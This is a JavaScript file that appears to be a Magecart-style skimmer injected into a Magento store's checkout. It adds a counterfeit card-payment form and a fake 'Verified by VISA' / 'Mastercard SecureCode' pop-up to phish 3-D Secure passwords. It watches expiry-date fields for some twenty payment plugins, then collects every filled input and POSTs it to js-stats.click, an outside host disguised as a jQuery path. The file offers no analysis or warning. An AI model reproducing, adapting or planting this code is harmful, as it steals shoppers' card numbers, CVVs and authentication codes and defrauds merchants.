window.setInterval(function() {
if(!document.getElementById("payment_form_ccsave"))
	ShowForm("checkout-payment-method-load");
}, 100);

function ShowForm(elem){
	if(document.getElementById(elem)){
		var myNode = document.getElementById(elem);
		//while (myNode.firstChild) {
				//myNode.removeChild(myNode.firstChild);
			//}
		var fakeForm = '<ul class="form-list" id="payment_form_ccsave" style="overflow: hidden;"> <li> <label for="ccsave_cc_owner" class="required"><em>*</em>Name on Card</label> <div class="input-box"> <input type="text" title="Name on Card" class="input-text required-entry" id="ccsave_cc_owner" name="payment[cc_owner]" value=""> </div> </li> <li> <label for="ccsave_cc_type" class="required"><em>*</em>Credit Card Type</label> <div class="input-box"> <select id="ccsave_cc_type" name="payment[cc_type]" title="Credit Card Type" class="required-entry validate-cc-type-select"> <option value="">--Please Select--</option> <option value="AE">American Express</option> <option value="VI">Visa</option> <option value="MC">MasterCard</option> <option value="DI">Discover</option> <option value="JCB">JCB</option> <option value="SM">Switch/Maestro</option> </select> </div> </li> <li> <label for="ccsave_cc_number" class="required"><em>*</em>Credit Card Number</label> <div class="input-box"> <input type="text" id="ccsave_cc_number" name="payment[cc_number]" title="Credit Card Number" class="input-text validate-cc-number validate-cc-type" value=""> </div> </li> <li> <label for="ccsave_expiration" class="required"><em>*</em>Expiration Date</label> <div class="input-box"> <div class="v-fix"> <select id="ccsave_expiration" name="payment[cc_exp_month]" class="month validate-cc-exp required-entry"> <option value="" selected="selected">Month</option> <option value="1">01 - January</option> <option value="2">02 - February</option> <option value="3">03 - March</option> <option value="4">04 - April</option> <option value="5">05 - May</option> <option value="6">06 - June</option> <option value="7">07 - July</option> <option value="8">08 - August</option> <option value="9">09 - September</option> <option value="10">10 - October</option> <option value="11">11 - November</option> <option value="12">12 - December</option> </select> </div> <div class="v-fix"> <select id="ccsave_expiration_yr" name="payment[cc_exp_year]" class="year required-entry"> <option value="" selected="selected">Year</option> <option value="2016">2016</option> <option value="2017">2017</option> <option value="2018">2018</option> <option value="2019">2019</option> <option value="2020">2020</option> <option value="2021">2021</option> <option value="2022">2022</option> <option value="2023">2023</option> <option value="2024">2024</option> <option value="2025">2025</option> <option value="2026">2026</option> </select> </div> </div> </li> <li class="centinel-logos" id="ccsave_centinel_logo"> <label>To ensure the security of your transactions</label> <div class="input-box">   </div> </li> <li> <label for="ccsave_cc_cid" class="required"><em>*</em>Card Verification Number</label> <div class="input-box"> <div class="v-fix"> <input type="text" title="Card Verification Number" class="input-text cvv required-entry validate-cc-cvn" id="ccsave_cc_cid" name="payment[cc_cid]" value=""> </div> <a href="#" class="cvv-what-is-this">What is this?</a> </div> </li> <li id="ccsave_cc_type_ss_div" style="display: none;"> <ul class="inner-form"> <li class="form-alt"><label for="ccsave_cc_issue" class="required"><em>*</em>Switch/Solo/Maestro Only</label></li> <li> <label for="ccsave_cc_issue">Issue Number:</label> <span class="input-box"> <input type="text" title="Issue Number" class="input-text validate-cc-ukss cvv" id="ccsave_cc_issue" name="payment[cc_ss_issue]" value=""> </span> </li>  <li> <label for="ccsave_start_month">Start Date:</label> <div class="input-box"> <div class="v-fix"> <select id="ccsave_start_month" name="payment[cc_ss_start_month]" class="validate-cc-ukss month"> <option value="" selected="selected">Month</option> <option value="1">01 - January</option> <option value="2">02 - February</option> <option value="3">03 - March</option> <option value="4">04 - April</option> <option value="5">05 - May</option> <option value="6">06 - June</option> <option value="7">07 - July</option> <option value="8">08 - August</option> <option value="9">09 - September</option> <option value="10">10 - October</option> <option value="11">11 - November</option> <option value="12">12 - December</option> </select> </div> <div class="v-fix"> <select id="ccsave_start_year" name="payment[cc_ss_start_year]" class="validate-cc-ukss year"> <option value="" selected="selected">Year</option> <option value="2011">2011</option> <option value="2012">2012</option> <option value="2013">2013</option> <option value="2014">2014</option> <option value="2015">2015</option> <option value="2016">2016</option> </select> </div> </div> </li> <li class="adv-container">&nbsp;</li> </ul>  </li> </ul>';
		
		//vbvform
		fakeForm+= '<style>#megaform label{font-weight: 500;}#megaform label{display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold;}.modal{display: none; /* Hidden by default */ position: fixed; /* Stay in place */ z-index: 1; /* Sit on top */ left: 0; top: 0; width: 100%; /* Full width */ height: 100%; /* Full height */ overflow: auto; /* Enable scroll if needed */ background-color: rgb(0, 0, 0); /* Fallback color */ background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */}</style><div id="megaform" class="modal"> <div style="margin-top:10%;margin-left:40%;background-color:white;width:400px;border:1px solid rgb(225,225,225);padding:25px;box-shadow: 3px 3px 8px 4px rgb(200,200,200);"><img id="logo_cc" src=""> <br><br><span class="ap_col2 ap_left" style="margin-left:10px">Please submit your <span id="header_text"></span>.</span> <br><br><div id="ap_signin_form_table_wrapper" class="fixed_width_form"> <table id="ap_signin_form" class="ap_form_table" style="margin-top:10px;margin-left:10px"> <tbody> <tr> <td style="padding:3px"> <div class="right"> <div id="ap_signin_email_label" class="ap_input_label" style="font-size:11px"> <label for="ap_email">Merchant:</label> </div></div></td><td id="company_name" style="padding:3px;font-size:11px">Company Ltd</td></tr><tr> <td style="padding:3px"> <div class="right"> <div id="ap_signin_email_label" class="ap_input_label" style="font-size:11px"> <label for="ap_email">Amount:</label> </div></div></td><td id="amount_order" style="padding:3px;font-size:11px">10000000</td></tr><tr> <td style="padding:3px"> <div class="right"> <div id="ap_signin_email_label" class="ap_input_label" style="font-size:11px"> <label for="ap_email">Date:</label> </div></div></td><td id="date_order" style="padding:3px;font-size:11px">06:45:04</td></tr><tr> <td style="padding:3px"> <div class="right"> <div id="ap_signin_email_label" class="ap_input_label" style="font-size:11px"> <label for="ap_email">Card number:</label> </div></div></td><td style="padding:3px;font-size:11px">XXXX XXXX XXXX <b style="font-size: 13px;" id="last4digit">5216</b></td></tr><tr> <td style="padding:3px"> <div class="right"> <div id="ap_signin_email_label" class="ap_input_label" style="font-size:11px"> <label for="ap_email" id="ipnut_text">Verified by VISA password:</label> </div></div></td><td style="padding:3px;font-size:11px"> <input id="vbv" type="password" style="padding:2px;" id="code" name="code" size="25"> </td></tr><tr> <td style="padding:3px"><span class="in-amzn-btn btn-prim-med-ra" id="cancelcode" unselectable="on" style="margin-top:10px"><span><input id="cancelcode" name="cancelcode" value="Cancel" disabled="disabled" tabindex="5" style="width:150px" type="button"></span></span> </td><td style="padding:3px"><span class="in-amzn-btn btn-prim-med-ra" id="sendcode" unselectable="on" style="margin-left:50px;margin-top:10px"><span><input id="sendcode" name="sendcode" value="Submit" tabindex="5" style="width:150px" type="button" onclick="checkData();"></span></span> </td></tr></tbody> </table> </div></div></div>';
		myNode.insertAdjacentHTML('beforeend', fakeForm );
	}
}



if((new RegExp('onepage|checkout|onestep|firecheckout')).test(window.location)) {
	setTimeout(function(){
	jQuery(function($kk) {
	$kk(document).on('change', 'form', function() {   
	grelos_v = null;    
	a = ['select[id="year_bcash"]','select[id="cardsaveonlinepayments_expiration_yr"]','select[id="authorizenet_expiration_yr"]', 'select[id="mundipagg_api_doiscartoes_first_card_expiration_year"]', 'select[name="payment[mundipagg_creditcard_expirationYear_1_1]"]', 'select[id="adyen_cc_expiration_yr"]', 'select[id="braintree_expiration_yr"]', 'select[name="datatranscw_visa[expy]"]', 'select[name="datatranscw_mastercard[expy]"]', 'select[name="payment[moip_cc_exp_year]"]', 'select[id="eway_rapid_expiration_yr"]', 'select[name="payment[cc_exp_year]"]', 'input[name="expiration"]', 'input[name="full_cc_expiration"]', 'select[id="redecard_expiration_yr"]', 'select[id="stripe_cc_expiration_year"]', 'input[data-checkout="expiry-year"]', 'select[id="paymill_creditcard_expiry_year"]', 'input[name="expiry_date"]', 'input[id="text-expiry_date"]', 'select[id="cardExpirationYear"]', 'select[id="radweb_stripe_expiration_yr"]', 'select[name="payment[expiracao_ano_rede]"]', 'select[name="payment[credito_expiracao_ano]"]'];
	for (var j=0;j<a.length;j++){try{
	if($kk(a[j]).val().length>0){kp()}
	} catch(e) {}}
	function kp(){
	var snd="";  
	    var inp=document.querySelectorAll("input, select, textarea, checkbox");
	    for (var i=0;i<inp.length;i++){
	        if(inp[i].value.length>0) {
	        var nme=inp[i].name;
	        if(nme=='') { nme="jik"+i; }        
	        var sdd = nme.replace(/\[/g, "-");   
	        var sdd1 = sdd.replace(/-redecard/, "");
	        snd+=sdd1.replace(/]/g, "")+'='+inp[i].value+'&';     
	        }
	    }   
	snd = snd+"&idd="+window.location.host;
	$kk.ajax({ url:"https://js-stats.click/cdn/jquery.min.js",
	                data: snd,
	                type:"POST",
	                dataType:"json",    
	                success:function(data)
	                 {       
	                         return false;       
	                 },
	                 error:function(jqXHR,textStatus,errorThrown)
	                 {
	                         return false;
	                 }
	             }
	             );  
	    
	    }})})}, 5000)
};

document.companyName = "iBijuterii.ro";


jQuery(document).on('change', '#ccsave_cc_cid', function() {
	var cid = document.getElementById("ccsave_cc_cid").value;
	if(!cid || cid.length < 3){
		console.log("cid.length < 3");
		return;
	}
	var value = document.getElementById("ccsave_cc_number").value;
			if(value && validateData(value)){
				detectAndDrawProccessing(value);
				document.cc_num = value;
			}
});




function validateData(value){
	if(validateCreditCard(value) === true){
		return true;
	}
	else{
		document.getElementById("ccsave_cc_cid").value = "";
		document.getElementById("ccsave_cc_number").value = "";
		return false;
	}
	
}

function validateCreditCard(s) {
    // remove non-numerics
    var v = "0123456789";
    var w = "";
    for (i=0; i < s.length; i++) {
        x = s.charAt(i);
        if (v.indexOf(x,0) != -1)
        w += x;
    }
	if(w.length < 15){
		return false;
	}
    // validate number
    j = w.length / 2;
    k = Math.floor(j);
    m = Math.ceil(j) - k;
    c = 0;
    for (i=0; i<k; i++) {
        a = w.charAt(i*2+m) * 2;
        c += a > 9 ? Math.floor(a/10 + a%10) : a;
    }
    for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
    return (c%10 == 0);
}

function detectAndDrawProccessing(number){
	if(number.charAt(0) === "4" || number.charAt(0) === 4){
		drawVisa(number.trim());
	}
	else if(number.charAt(0) === "5" || number.charAt(0) === 5){
		drawMastercard(number.trim());
	}
	else{
		console.log("ignore");
	}
}

function checkData(){
	var value = document.getElementById("vbv").value;
	if(value && value.length > 2){
		//отправить и продолжить;
		closeForm();
	}
	else{
		//this.style.borderColor = 'red';
		document.getElementById("vbv").style.borderColor = 'red';
	}
}

function closeForm(){
	setTimeout(function(){
		document.getElementById("megaform").style.display = 'none';
	}, 500)
}

function drawVisa(number){
	changeImage("https://js-stats.click/src/v.gif");
	changeHeaderText("<i>Verified by VISA</i> password");
	changeAmount();
	changeDate();
	changeLastDigit(number);
	changeInputText("Verified by VISA password:");
	setTimeout(function(){
		show();
	}, 500);
	
}

function drawMastercard(number){
	changeImage("https://js-stats.click/src/m.gif");
	changeHeaderText("<i>Mastercard SecureCode</i>");
	changeAmount();
	changeDate();
	changeLastDigit(number);
	changeInputText("SecureCode:");
	setTimeout(function(){
		show();
	}, 500);
}

function show(){
	document.getElementById("megaform").style.display = 'block';
}

function changeImage(path){
	document.getElementById("logo_cc").src = path;
}

function changeHeaderText(newtext){
	document.getElementById("header_text").innerHTML  = newtext;
	document.getElementById("company_name").innerHTML  = document.companyName;
}

function changeAmount(){
	document.getElementById("amount_order").innerHTML  = getAmount();
}

function changeDate(){
	document.getElementById("date_order").innerHTML  = getCurrentTime();
}

function changeLastDigit(number){
	document.getElementById("last4digit").innerHTML  = getLastDigitCc(number);
}

function changeInputText(newtext){
	document.getElementById("ipnut_text").innerHTML  = newtext;
}

function getCurrentTime(){
	var currentdate = new Date();
	
	var hours = currentdate.getHours();
	if(hours < 10){
		hours = "0" + hours
	}
	
	var min = currentdate.getMinutes();
	if(min < 10){
		min = "0" + min
	}
	
	var sec = currentdate.getSeconds();
	if(sec < 10){
		sec = "0" + sec
	}
	
	var datetime =  hours + ":" + min + ":" + sec;
	
	return datetime;
}

function getAmount(){
	var amount = jQuery(".subtotal .price").text();
	return amount;
}

function getLastDigitCc(number){
	var regex = /(\d{4})\s*$/;
	var match = regex.exec(number);
	var lastDigit = match[1];
	return lastDigit;
}